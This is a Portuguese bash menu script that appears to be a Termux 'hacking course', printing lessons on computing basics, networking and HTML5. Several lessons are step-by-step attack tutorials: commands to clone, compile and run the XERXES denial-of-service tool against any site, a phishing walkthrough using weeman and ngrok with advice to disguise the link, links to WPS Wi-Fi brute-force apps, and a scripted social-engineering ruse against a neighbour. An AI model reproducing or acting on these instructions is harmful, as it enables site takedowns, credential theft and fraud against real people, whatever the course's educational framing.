\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m \033[1;32m[\033[0m12\033[1;32m]\033[0m \033[1;31mTipos de Algoritmos\033[0m        \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m3\033[1;32m]\033[0m \033[1;31mRedes Básico:\033[0m       \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m     \033[1;31mServiços de redes\033[0m   \033[1;36ml   l\033[0m \033[1;32m[\033[0m13\033[1;32m]\033[0m \033[1;31mBaixando o App Pseudocode\033[0m  \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m4\033[1;32m]\033[0m\033[1;31m Ddos/Dos Pra Leigos\033[0m \033[1;36ml   l\033[0m \033[1;32m[\033[0m14\033[1;32m]\033[0m \033[1;31mNosso primeiro olá mundo\033[0m   \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m5\033[1;32m]\033[0m \033[1;31mComo Fazer Pishing\033[0m  \033[1;36ml   l\033[0m \033[1;32m[\033[0m15\033[1;32m]\033[0m \033[1;31mOperadores Aritméticos\033[0m     \033[1;36ml\033[0m
\033[1;36ml\033[0m     \033[1;31mPelo Termux\033[0m         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m \033[1;32m[\033[0m16\033[1;32m]\033[0m \033[1;31mVerdadeiro ou Falso\033[0m        \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m6\033[1;32m]\033[0m \033[1;31mUsb Killer e fake\033[0m   \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m     \033[1;31mNews\033[0m                \033[1;36ml   l\033[0m\033[1;32m [\033[0m17\033[1;32m]\033[0m \033[1;31mUm Pouco Sobre o Escreval\033[0m  \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m7\033[1;32m]\033[0m \033[1;31mIntrodução ao Html5\033[0m \033[1;36ml   l\033[0m \033[1;32m[\033[0m18\033[1;32m]\033[0m \033[1;31mExercício\033[0m                  \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m8\033[1;32m]\033[0m \033[1;31mDescobrir a Senha   \033[0m\033[1;36ml   l\033[0m \033[1;32m[\033[0m19\033[1;32m]\033[0m \033[1;31mComando de leitura  \033[0m       \033[1;36ml\033[0m
\033[1;36ml\033[0m     \033[1;31mdo Wi-Fi q vc Está  \033[0m\033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m     \033[1;31mConectado(Sem Root)\033[0m \033[1;36ml   l\033[0m \033[1;32m[\033[0m20\033[1;32m]\033[0m \033[1;31mCriando Um Programa\033[0m        \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m9\033[1;32m]\033[0m \033[1;31mComo Pegar IP Por\033[0m   \033[1;36ml   l\033[0m \033[1;32m[\033[0m21\033[1;32m]\033[0m \033[1;31mTirando Dúvidas\033[0m            \033[1;36ml\033[0m
\033[1;36ml\033[0m     \033[1;31mEngenharia Social\033[0m   \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m \033[1;32m[\033[0m22\033[1;32m]\033[0m \033[1;31mAvaliação Final    \033[0m       \033[1;36m l\033[0m
\033[1;36m\-------------------------/   \---------------------------------/\033[0m

\033[1;33mobs:\033[0m \033[1;34mCaso Queira Voltar Ao Menu Principal, Digite 23 \033[0m
'
          read MENU_CURSOS_TREINAMENTOS
          clear
          case "$MENU_CURSOS_TREINAMENTOS" in
             1)
              #Explicacoes basicas
                echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mEXPLICAÇÕES BÁSICAS\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33mHardware:\033[0m \033[1;31mÉ o material do computador ou seja oq vc pode ver e tocar. Tipo o mouse e o teclado.\033[0m

\033[1;33mSoftware:\033[0m\033[1;31m São os programas ex: word (editor de texto), Whatsapp,Excel, bloco de notas etc... vale destacar aqui que um computador sem programas é praticamente inútil. Em outras palavras é oq vc não pode ver nem tocar.\033[0m

\033[1;33mIP:\033[0m\033[1;31m É um protocolo de internet. Enfim e como se fosse sua localização do seu aparelho na internet.\033[0m

\033[1;33mBINARY:\033[0m \033[1;31mÉ como se fosse a linguagem do computador por ex: um computador não fala a linguagem humana por ex: russo, inglês etc... ele é muito burro. Tipo se vc digitar uma letra por ex: A o computador vai processar e pra ele enteder ele vai transformar esse A que vc digitou no teclado em uma sequência de números ou seja byte... um byte equivale a 8 bits. Um bit pode ser 0 ou 1.\033[0m

\033[1;33mEXEMPLOS:\033[0m
\033[1;31mBIT:
1 é um bite.
0 é um bit também.

BYTE:
Um byte equivale a  8 bits.
 A=01010101(Isso n é a representação de a em binário é só um exemplo rs) 0 significa desligado e 1 significa ligado.\033[0m

\033[1;33mMemória ram:\033[0m\033[1;31m Memória temporária. que fica no computador e quando desligamos o computador ela some. Essa memória ela serve pra realizar algumas coisas como por exemplo quando copiamos uma coisa como uma palavra ela vai pra memória ram.... se n me engano.\033[0m

\033[1;33mPrograma:\033[0m\033[1;31m É uma lógica que foi passado pro papel (algoritmo-passo a passo para resolver um problema). Que pode ser tanto em uma linguagem de programação ou não.\033[0m

\033[1;33mHd:\033[0m\033[1;31m podemos dizer que ele armazena dados muito diferente da memória RAM pós quando o pc (computador pessoal) é desligado os dados ficam gravados no HD. \033[0m

\033[1;33mSistema operacional(SO):\033[0m \033[1;31m"programa principal responsável por administrar  os restos dos programas". É como o gerente ele está ali só mandando e no caso o freguês é você e o resto dos empregados são os hardwares etc..... Exemplos de sistemas operacionais: Windows,Linux(as suas distribuições) e Android. \033[0m

\033[1;33mUsuário:\033[0m\033[1;31m Em informática, usuário é oq utiliza um programa ou algo (uma determinada  tecnologia)criado por outros.\033[0m

\033[1;33mHacker:\033[0m \033[1;31mO gênio da informática. Ele usa seu conhecimento de programação redes etc.... para o bem de sua empresa ou para ajudar pessoas. \033[0m

\033[1;33mCracker:\033[0m\033[1;31m Usa seu conhecimento para o mal. Tem quase o mesmo conhecimento do hacker porém não é bem um gênio(Na minha opinião) por exemplo ele acaba de descobrir como fazer virus e começa a fazer vários para formatar o PC de tal pessoa que ele nem conhece muitas vezes sem motivo algum.\033[0m

\033[1;33mCtf: \033[0m\033[1;31mÉ uma sigla que significa capture the flag ou seja capture a bandeira. Em termos de pentest é uma competição hacker estilo desafio.\033[0m

\033[1;33mLógica de programação:\033[0m \033[1;31mÉ uma matéria que você aprende antes de estudar programação em Si na faculdade. Eu não sei se os método mudaram hoje em dia mas de qualquer forma ainda é super recomendado aprender lógica de programação antes de estudar alguma linguagem de programação.

Bom, Em lógica de programação você aprende como que tudo funciona ou seja você vai ter uma noção. E em lógica de programação basicamente você vai aprender a  criar algoritmos.\033[0m

\033[1;33mTermux:\033[0m\033[1;31m 'O termux é um emulador de terminal linux que te da acesso ao shell do android'.

Em outras palavras existem basicamente duas formas de se utilizar um computador e quando eu digo computador eu estou me referindo ao celular, essas duas formas são o modo gráfico e o modo texto.

O modo gráfico é o qual nós estamos acostumados. Aquele aonde tem janelinhas e tals,Sabe os editores de texto como o word? Então, no modo texto também tem editores de texto... como o vi e o nano. Vale destacar que o melhor editor de texto no modo texto é aquele que você esteja mais acostumado.\033[0m

\033[1;33mAluno -\033[0m\033[1;31m Aonde você quer chegar com isso?\033[0m
\033[1;33mHelexiel -\033[0m \033[1;31mOq eu quero dizer é que com o termux da para utilizar o celular em modo texto.\033[0m"
                echo;echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR\033[0m"
                read SEGUE;;
             2)
              #Intro a Seg Na Net
                echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mINTRO A SEGURANÇA NA INTERNET\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;31mPara quem não sabe , A falta de segurança na nossa vida seja tanto virtual como na vida real. É muito fraca, então assim como os crimes cometidos na vida "real" como:

•Roubo
•homicídio
•Estrupo seguido de morte entre outros...

Vem aumentando, e no mundo virtual... Ou seja os crimes virtuais vem aumentando cada vez mais , e vem a pergunta estamos 100% seguros? A resposta é não.

Não existe 100% de anonimato na internet e também não tem como ficarmos 100% seguros.

Nessa pequena aula eu digo como os 'hackers' ou crackers fazem para burlar os sistemas.

Em Primero lugar eu como 'um hacker iniciante' ou um estudante, quero dizer que existem uma diferença entre hacker e cracker que muitas pessoas confundem.\033[0m

\033[1;33mDiferença entre hacker e cracker:\033[0m

\033[1;33mHacker:\033[0m

\033[1;31mgasta a maior parte do seu tempo estudando, desenvolvendo programas e trabalhando. Enfim oq eu quero dizer é que o hacker é aquele gênio da informática que é do bem ou seja usa seus conhecimentos para ajudar as pessoas.\033[0m

\033[1;33mCracker:\033[0m

\033[1;31mTem quase os mesmos conhecimentos do que o hacker, as vezes até mais. Ele gasta a maior parte do seu tempo procurando falhas em sistemas seja sites ou problemas enfim e usa seus conhecimentos para o mal. Quando eu digo mal eu me refiro a invadir contas para zoar e derrubar sites por diversão essas coisas.\033[0m

\033[1;33mForça bruta e engenharia social:\033[0m

\033[1;31mExistem duas formas basicamente que ambos usam pra invadir contas que são:

•Força bruta
•ENGENHARIA SOCIAL\033[0m

\033[1;33mForça bruta:\033[0m

\033[1;31mSendo que a força bruta consiste em fazer uma wordlist (Significa um arquivo.txt com possiveis senhas) por exemplo. E usar alguma script (Ferramenta) para realizar o ataque, Vale destacar que uma força bruta demora muito tipo as vezes até anos ou meses ou até dias dependendo da sua wordlist.


Logo abaixo irei citar os nomes de alguns apps para fazer força bruta em wi-fi com a falha wpa.

Wps wpa Premium: http://apkbox.in/apk/download-wpsxcvbvxcb/#download 

Androdumper: https://play.google.com/store/apps/details?id=com.bigos.androdumpper 

Wps Connect: https://play.google.com/store/apps/details?id=com.ngb.wpsconnect 

Wifi wps: https://play.google.com/store/apps/details?id=com.berkinalex.wifiwps 

Wps PinGen: https://play.google.com/store/apps/details?id=wifi.es.wpspingenerator 

Wifi warden: https://play.google.com/store/apps/details?id=com.xti.wifiwarden 

Site pra gerar ou pegar pin:

http://wpspinleri.blogspot.com.br/p/huawei.html?m=1

Obs: Eu não irei explicar mais pq é só procurar na net como usar, ou então é só entrar no app e utilizar.\033[0m


\033[1;33mEngenharia social:\033[0m

\033[1;31mBom, engenharia social é o famoso estelionato (171). Então é como se você fosse tentar enganar a pessoa pra pegar uma senha etc... com engenharia social você pode pegar até a alma do indivíduo.

Vou citar um exemplo pra 'hackear wi-fi' Por engenharia social:

Supondo que você tem um vizinho com Wifi e você não saiba a senha, Então você pode entrar em contato com ele pelo Whatsapp e dizer o seguinte....'olá, Sou da empresa do seu Wifi, estamos fazendo um teste com todos os roteadores da nossa marca. Então seu número tava aqui no nosso sistema, Pra realizar o teste você só precisa apertar o botão wps que fica atrás do seu roteador'.\033[0m

\033[1;33mConclusão:\033[0m

\033[1;31mEnfim, isso foi só pra você ter uma ideia como funciona. Mas vale destacar aqui que se você praticar um estelionato(engenharia social), você pode pegar até 4 anos de prisão ou 5. Isso para um imputável, agora para o adolescente você pode pagar com uma medida socioeducativa enumeradas no eca (estatuto da criança e do adolescente), que são elas:

1- Advertencia;
2- Obrigação de reparar o dano;
3- Prestação de serviço a comunidade;
4- Liberdade assistida (LA);
5- Inserção em regime de semi-liberdade;
6- Internação em estabelecimento educacional;

Vale destacar que é o juiz que escolhe isso. Eu não tenho certeza se isso vai acontecer pois eu não sou nenhum advogado mas já fiz um curso sobre eca(estatuto da criança e do adolescente).\033[0m"
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR\033[0m"
                read SEGUE;;
             3)
               #Redes Básico: Serviços de redes
                echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mSERVIÇOS DE REDES\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33mServiços de redes:\033[0m
\033[1;31msão aplicações existentes em servidores de redes. Esses serviços possuem características distintas dependendo do protocolo que foi escolhido... Por meio deles podemos disponibilizar alguns recursos ao usuário, proporcionar segurança, 
monitorar e automatizar tarefas.

A seguir, listagem de protocolos muito utilizada em uma rede 
computacional...\033[0m

\033[1;33mHttp e https:\033[0m
\033[1;31mHttp é uma sigla que aparece sempre que precisamos acessar determinando site.... É através desse serviço que conseguimos navegar em páginas web. O http utiliza texto claro para trafegar seus dados isso acaba gerando problemas de segurança pois caso algum invasor interceptar esses dados eles estão visíveis e compreensíveis ou seja não estarão criptografadas.

Https mantém a mesma funcionalidade do http, porém criptografa todas as informações trocadas. Enfim a criptografia resolve o problema do http. Digamos que o S no final do https seja de segurança.\033[0m

\033[1;33mDNS:\033[0m
\033[1;31mtalvez seja um dos protocolos mais importantes da Internet pois sem ele teríamos que colocar o ip do site na hora de acessar o mesmo. Vc já imaginou quando for ter que entrar no xvideo colocar o ip? Não até vc ver seu vídeo vc já gozou então com ele basta digitar xvideo e pronto\033[0m

\033[1;33mIP:\033[0m
\033[1;31mPra quem não sabe oq é ip ele é como se fosse o seu endereço na internet. Por exemplo com seu ip da pra saber aonde vc mora. 

Da pra rastrear e até mesmo 'invadir' ele pois vamos supor que é a mesma coisa que vc saber aonde é sua casa então o invasor sabendo isso ele pode explorar vulnerábilidades e até mesmo atacar os pilares de segurança por ex: um ataque a disponibilidade como ddos. O invasor vendo que n pode invadir a máquina ele pode jogar pedras no telhado na casa enfim isso é chato mas o atacante n invadi.\033[0m

\033[1;33mFTP E SMB:\033[0m
\033[1;31mFTP é um dos protocolos mais antigos e utilizados para a transferência de arquivos.

O SMB, assim como o FTP, tem como função principal o compartilhamento de arquivos, com o passar dos anos esse protocolo foi evoluindo e atualmente é possível compartilhar impressoras, definir níveis de acesso e autenticações.\033[0m

\033[1;33mSMTP e POP3:\033[0m
\033[1;31mSMTP é protocolo padrão utilizado para o envio de e-mail por meio da Internet. Após o cliente ter feito a mensagem e colocado o destinatário o protocolo smtp entra em ação levando a mensagem até o servidor de destino enfim um outro protocolo (N é o smtp e sim o pop3) é necessário para realizar a entrega ao destinatário.
O POP que está atualmente na sua versão 3 é responsável pela entrega dos e-mails. \033[0m


\033[1;33mCONTEÚDO EXTRA(BÔNUS)\033[0m

\033[1;31mPara pegar o ip de um determinado site, Você pode utilizar o termux. Com um desses dois comandos:

ping (site)
dig (site)

Vale destacar que existe um mito nesses comandos no YouTube que é 'você digitando o ping e o número da pessoa, você consegue o ip dela', Bom a resposta é não. Isso só é mimi pra pegar like em video.\033[0m"
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR\033[0m"
                read SEGUE;;
             4)
              #DDOS/DOS PARA LEIGOS
                echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mDDOS/DOS PRA LEIGOS\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) PRA QUE SERVE:\033[0m
\033[1;31mDe forma resumida ddos e dos serve para a mesma coisa que é derrubar sites (tirar sites do ar), impedindo que alguém o acesse.\033[0m

\033[1;33mDiferença entre ddos e dos:\033[0m

\033[1;31mDdos é várias pessoas fazendo o ataque.

Dos é uma pessoa só fazendo.\033[0m

\033[1;33m2) COMO FAZER UM ATAQUE DDOS/DOS:\033[0m

\033[1;31mUma das formas de fazer esse ataque é pelo termux usando algumas scripts.\033[0m

\033[1;33mO que é script:\033[0m

\033[1;31mScript é como se fosse um algoritmo mas na minha opinião tem uma diferença, algoritmo é um passo a passo a ser realizado. Ex: É como uma receita de bolo.

Um programa de computador nada mais é do que um algoritmo. Mas existem algoritmos na nossa vida ou seja no nosso dia-a-dia como atravessar uma rua ir ao colégio....

E script nada mais é do que algoritmo só que escrito em uma linguagem de programação por exemplo vc tem um arquivo.py e o código está lá dentro....\033[0m

\033[1;33m3) PASSO A PASSO PARA REALIZAR UM ATAQUE DDOS/DOS:\033[0m

\033[1;33mEntão uma boa script para iniciantes é o xerxes.\033[0m \033[1;31mque é mais fácil por causa que não precisa digitar ping (nome do site) para pegar o ip do mesmo.

Termux nada mais é do que um emulador. E um emulador é algo que emula uma coisa, por exemplo o termux ele emula o kali linux (sistema operacional focado para pentest). \033[0m

\033[1;33mDigamos que existem duas formas de se usar um computador que é o modo gráfico e modo texto.\033[0m \033[1;31mpara quem utiliza o computador a menos de 20 anos talvez nunca tenha usado o modo texto e sim só o modo gráfico aonde o computador perde muito tempo desenhando a janela...

Isso faz com que o modo texto seja mais produtivo pois faz com que o computador não perca muito recurso escrevendo a janela (o gráfico) etc.... 

Vale destacar que no tempo do modo texto, era possivel apenas mudar as cores do modo texto. Por exemplo os arquivos e as pastas ficam de uma cor diferente.

Oq eu quero dizer é que com o termux da para utilizar o celular em modo texto.\033[0m

\033[1;33mMAS DEIXANDO DE ENROLAÇÃO, E VAMOS PARA A PRÁTICA:\033[0m

\033[1;33m•Primeiro passo:\033[0m\033[1;31m Baixe o terminal termux na play store (vale destacar que o termux não foi feito pra hackear mas sabe como é.... da pra fazer um bom estrago com ele).\033[0m

\033[1;33m•Segundo passo: entre no termux e digite.\033[0m

\033[1;31mtermux-setup-storage

#TUDO NO TERMUX PRECISA SER DIGITADO EM MINÚSCULO PORÉM TEM UMAS EXCEÇÕES POR EXEMPLO PRA ENTRAR EM UMA PASTA ETC...


#Isso acima é um comando que serve para dar permissões ao aplicativo para acessar os arquivos do seu aparelho.\033[0m


\033[1;33m•Terceiro passo: \033[0m\033[1;31mDigite esses dois comandos um por vez: 
pkg update (dps da enter)
pkg upgrade(dps da enter)

#esses comandos servem para atualizar os repositórios, enfim preste atenção se aparecer y/n em alguma hora...digite y e der enter\033[0m

\033[1;33m•Quarto passo: \033[0m\033[1;31mdigite...
pkg install git (depois de enter)

#Se aparecer y/n na tela do termux digite y e de enter.
# esse comando vai instalar o git. E com ele da pra baixar script por links digamos assim...\033[0m

\033[1;33m•Quinto passo: \033[0m\033[1;31mdigite git clone https://github.com/XCHADXFAQ77X/XERXES

#esse comando acima vai instalar a script xerxes para realizar o dos.
#caso queira saber em qual diretório você estar digite pwd. Agora queira saber oq tem dentro de um diretório(tipo ver as pastas que tem), digite ls.\033[0m

\033[1;33m•Sexto passo:\033[0m \033[1;31mdigite:

cd XERXES;chmod +x *;ls

clang xerxes.c -o xerxes

./xerxes (digite aqui qualquer site para fazer o ataque) 80.

#caso queira cancelar o ataque é 'ctrl + c'.\033[0m"
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR\033[0m"
                read SEGUE;;
             5)
              #COMO FAZER PISHING PELO TERMUX
                echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mCOMO FAZER PISHING PELO TERMUX\033[0m\033[1;36m =
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) O QUE É PISHING:\033[0m

\033[1;31mBom, antes de tudo eu gostaria de falar sobre oq é pishing, Pishing é o invasor fazer um site fake simulando ser o verdadeiro de login. Sendo assim... o invasor manda para a vítima o site fake e usa alguma engenharia social/Mentira para fazer com que a mesma entre no site. Como 'Entre aqui e ganhe'...

Enfim, Oq eu quero dizer é que quando a vítima colocar o seu login e senha, O invasor vai ver isso no seu terminal, Ou o login e senha vai ser enviado pro gmail do invasor.\033[0m

\033[1;33m2) PRINCIPAIS PARTES DO PROCESSO:\033[0m

\033[1;31mEu (Helexiel) dividir os principais passos em duas partes, Que são:

•REDE INTERNA;
•REDE EXTERNA;\033[0m

\033[1;33m3) QUAL A DIFERENÇA ENTRE REDE INTERNA E REDE EXTERNA:\033[0m

\033[1;31mRede interna é só quem está na sua rede wi-fi, Ou seja o link do site fake, Só vai funcionar pra quem está na sua rede wi-fi.

Já em rede externa é o contrário, O link vai funcionar até pra quem estiver em outro estado. Como por exemplo: Se depare com a situação, vc está no acre e quer enviar o link pra uma pessoa de Brasília... Como o link é em rede externa o recebente vai conseguir acessar o link.\033[0m

\033[1;33m4) PASSO A PASSO PARA FAZER O LINK EM REDE INTERNA:\033[0m

\033[1;31mPrimeiro instale/Baixe o git no menu principal, Escolhendo a opção 10.

Escolha a opção de atualizar os repositórios, Baixe também o python2, curl e o Perl.

E por fim.... instale o weeman no menu principal, digitando a opção 7.

Logo após isso, Abra uma outra aba no  termux, e digite esses comandos abaixo:

[1] entrando na pasta do weeman
cd weeman

[2] Executando a script
python2 weeman.py

[3] logo após executar vai aparecer uma coisa vermelha
set url LINK_DO_SITE_Q_DESEJA_CLONAR

[4]
set action_url LINK_DO_SITE_Q_DESEJA_CLONAR

[5]
run


Após ter digitado 'run', Vai surgir um link, e esse link é do site fake. E vale destacar aqui que esse link não vai funcionar em rede externa.

Para fixar o conteúdo desse título, Eu recomendo vc copiar e colar esse link no navegador, e em seguida digitar qualquer coisa na parte de login e senha. E depois voltar ao termux e oq vc digitou irá aparecer na aba do weeman.\033[0m

\033[1;33m5) PASSO A PASSO PARA FAZER O LINK EM REDE EXTERNA:\033[0m

\033[1;33mObs:\033[0m\033[1;31m Para serguir esse tutorial vc tem que fazer o link em rede interna, E não ter fechado as abas.\033[0m

\033[1;33m5.1) entre no site do ngrok e crie uma conta, Para obter o 'Token':\033[0m

\033[1;31mO link do site do ngrok é https://ngrok.com/ 

Vale destacar que a sua conta por ser gratuita, Irá ficar disponível só por 15 dias.

Enfim, Logo após ter feito a sua conta, copie tudo da opção 3 Aonde começa com 'Token'.\033[0m

\033[1;33m5.2) BAIXANDO O PS.NGROK NO MENU PRINCIPAL:\033[0m

\033[1;31mLogo após ter copiado o Token... abra a aba aonde está sendo executado a script HELESCRIPT e escolha a opção 9.\033[0m

\033[1;33m5.3) CRIANDO O LINK PARA REDE EXTERNA:\033[0m

\033[1;31mAbra uma nova aba no termux, e digite

[1]
./ngrok
[2] Copiando e colando o seu token
./ngrok TOKEN
[3] Criando o link
./ngrok http 8080

Logo após isso espere aquela parte aonde tá 'offline', Ficar 'online'. E o link será criado...  o link certo é o que tá com https!

Vale destacar aqui que o certo é você encurtar o URL, Pois se n assim vai ficar muito suspeito, Vc mandar o site que o ngrok gerou pra sua vítima.

Eu aconselho esse site pra encurtar os seus sites fake abaixo, Pois vc pode personalizar pra ficar parecido com o real:

https://is.gd/
\033[0m
"
                 echo
                 echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR\033[0m"
                 read SEGUE;;
             6)
              #USB KILLER E FAKE NEWS
                 echo -e "\033[1;36m
=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mUSB KILLER E FAKE NEWS\033[0m\033[1;36m =
=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;31mVocê já achou algum pendrive na rua? Ou em algum lugar ? E ficou curioso para saber oq tinha dentro do mesmo? Bom, Nessa aula eu vim te alertar e depois que vc ler essa mensagem vc vai pensar duas vezes antes de colocar um pendrive no seu PC(computador pessoal). Enfim, Eu queria contar uma história (Não real porém que pode ocorrer).\033[0m

\033[1;34mVocê é um professor, Chega em sua casa, Depois vai pegar alguma coisa na sua mochila (ex: notebook).... E encontra um pendrive com a cor vermelha e pelo que você saiba vc n tem um pendrive enfim vc conecta ele no seu notebook e derrepente ele queima\033[0m

\033[1;31mvocê pode ter sido vítima de uma das pegadinhas mais cruéis que a tecnologia pode oferecer: o USB 
Killer. Bom, pode ter sido um aluno com raiva de você ter dado uma nota baixa para ele.\033[0m

\033[1;33mSaiba mais...\033[0m

\033[1;31mO dispositivo foi revelado ao mundo em março 'deste ano' pelo pesquisador russo conhecido como 'Dark Purple', e agora ganhou uma nova versão ainda mais mortal. Segundo seu criador, O USB Killer 2.0 é capaz de fritar praticamente qualquer dispositivo com uma interface USB. 

Bom, eu vou dar uma resumida para você enteder como funciona, porém aconselho você pesquisar mais pós não precisa acreditar em tudo que eu falo, Pós vai que é fake news(Só avisando não me interprete errado, pós eu nunca vou dar uma aula errada sem ter fontes confiáveis por exemplo eu pesquisei antes de escrever isso.) \033[0m

\033[1;33mAluno - Oq é fake news?
R=\033[0m\033[1;31m Vou dar um resumo, Fake news são notícias falsas 'na internet' O poder disso é tão alto que pode até chegar a eleger um presidente ou até um espertinho já foi eleito assim. Você já deve ter ouvido falar sobre isso na TV eu acho.

mas eu gostaria de dar um exemplo de fake news nas redes sociais é um caso particular meu, um dia eu tava online no whats e chegou um passarinho(Uma pessoa) no meu pv e mandou um print (foto) de um grupo chamado tenebris lixo e nessa foto o dono do grupo Sec 9 reais/K3 disse que iria me dar exposed( Divulgar meus dados pessoais) Bom, Primeiro eu gostaria de dizer que eu nunca cadrasto meus chips no meu CPF e muito menos de algum parente meu enfim eu pego na internet e eu levo a sério isso sobre n falar meu nome (Ou dados pessoais) na internet e eu sabia que ele n ia conseguir.

E do nada tavam divulgando em uns grupos um exposed de uma pessoa que tinha 30 anos, e eu achei engraçado pois antes disso o sec 9 reais disse que eu tinha 17 (ou 16 por ai) anos e no exposed tava dizendo que eu tinha 30 anos. Bom, ele deu exposed fake e em vários amigos meus e em mim também. Se dismentimos ele ? Sim, lógico temos provas e tudo. Bom esse foi um exemplo de fake news na internet.\033[0m

\033[1;33mAluno - Como identificar fake news?
R= \033[0m\033[1;31mAlgumas características de uma notícia falsa são:

•Tom alarmista;
•Autor sem nome;
•Especialistas desconhecidos;
•Site desconhecido;
•Erros gramaticais;
•Conteúdo sensacionalista; \033[0m

\033[1;33mMas voltando ao assunto...\033[0m

\033[1;31mO usb funciona basicamente assim(É um resumo do resumo) o pendrive ele acumula carga do computador e descarrega de volta no computador com o intuito de queimar tudo que for possível. Ao devolver a tensão para a fonte de energia, O aparelhinho é capaz de queimar o processador e placa mãe porém é muito provável que não afete o HD por isso não é indicando para quem quer eliminar informações de um computador.\033[0m

\033[1;33mBônus (CONTEÚDO EXTRA):\033[0m
\033[1;31mVocê pode ver como fazer um usb killer caseiro nesse link( Não tenho certeza que funciona): https://youtu.be/JResFSizx6M
\033[0m"
                 echo
                 echo  -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                 read SEGUE;;
             7)
              #Intro ao html5
                 echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mINTRO AO HTML5 \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=\033[0m

\033[1;34mNesta pequena aula, eu irei mostrar uma introdução ao html5. E logo abaixo você terá o conteúdo programático da aula ou digamos oq eu irei mostrar.\033[0m

\033[1;33mConteúdo programático:\033[0m

\033[1;34m•O que é html5
•Um pouco da história
•O que é css
•Tags html5
•Primeiro olá mundo
•Criando um arquivo vazio pelo termux


Pra quem não sabe oq é html5, O html5 é uma linguagem de hipertexto sendo o básico pra criar sites.


Antes conteúdo e formatação eram uma coisa só, a gente tinha todo o conteúdo da página...home page e a formatação dentro do documento.


Com o passar do tempo os programadores e os webdesing perceberam que isso não era só uma coisa errada como chata de se fazer.


Foi ai que surgiu o css, Ou seja uma coisa é formatação outra é conteúdo. Enfim, o html5 só serve digamos pra colocar o texto videos,imagens etc.... E\033[0m \033[1;33mo CSS que é uma linguagem de folhas de estilo.\033[0m\033[1;34m Ou seja é com o CSS que você vai formatar o texto e deixar o site mais agradável ao usuário pois só com o html5 isso não é possivel. era possível antes mas hoje em dia o conceito mudou.


O html não é uma linguagem nova. E independente de você ser programador ou web design, você tem que aprender html.


Tudo aquilo que você já sabe do html4 deixará de exister? Não, muito pelo contrário. Isso que é a sua base pro html5. Existem coisas que vem desde o html4.


O bacana do html5 é que ele trouxe uma serie de recursos de comandos novos que resolvem 'n' problemas, que antes a gente tinha que recorrer pra uma serie de outras linguagens.


A estrutura básica do html4 pro html5 é diferente.


Se você quiser aprender html5, você pode usar qualquer editor de texto. Se vc quiser visualizar o arquivo no navegador mude a extensão dele pra '.html'. Ex: 'Arquivo.html'


Vale destacar que\033[0m\033[1;33m o html5 funciona a base de tags\033[0m\033[1;34m que são:


Ex:

Tag única:

É fechada nela mesmo. Ou seja ela é a própria abertura e fechamento.

Ex de tags únicas:

<br/>
 
A tag acima serve pra pular de linha ou seja quebra de linha.

Tags duplas:

São tags que precisam de outra para fecha-la ex:

•<html> </html>
•<body> </body> 

Enquanto as tags....

•<p> </p>

Que significa parágrafo, serve para digitar algo na tela.


Bom, existe uma lenda que diz que\033[0m\033[1;33m se você não der um 'Olá mundo'\033[0m\033[1;34m, Você nunca aprenderá determinada tecnologia.


Então, para você não entrar nessa  'maldição'. Crie um arquivo vazio e cole esse código abaixo e depois mude a extensão para '.html'.


<!doctype html>
<html>
    <head>
    </head>
     <body>
            <p> Olá mundo  </p>
     </body>
</html>
 \033[0m


\033[1;33mObs: \033[0m\033[1;34mCaso você queira usar o emulador de terminal termux para criar um arquivo vazio digite:

---------
termux-setup-storage
pkg update
pkg upgrade
pkg install nano
----------
cd storage;cd shared;ls
nano arquivovazio.html
----------------
Agora digite(Ou cole) o código que foi mostrado acima.
------------------
